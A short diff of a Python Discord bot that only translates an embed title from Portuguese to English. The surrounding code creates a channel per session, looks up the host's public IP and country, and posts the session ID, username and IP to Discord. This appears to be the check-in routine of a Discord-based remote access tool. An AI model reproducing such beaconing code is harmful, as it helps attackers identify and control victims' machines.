@@ -29,7 +29,7 @@ async def on_ready():
     channel = await guild.create_text_channel(session_id)
     ip_address = requests.get("https://ipapi.co/json/").json()
     data = ip_address['country_name'], ip_address['ip']
-    embed = discord.Embed(title="Nova sessão criada", description="", color=0xfafafa)
+    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
     embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
     embed.add_field(name="Username", value=f"```{login}```", inline=True)
     embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
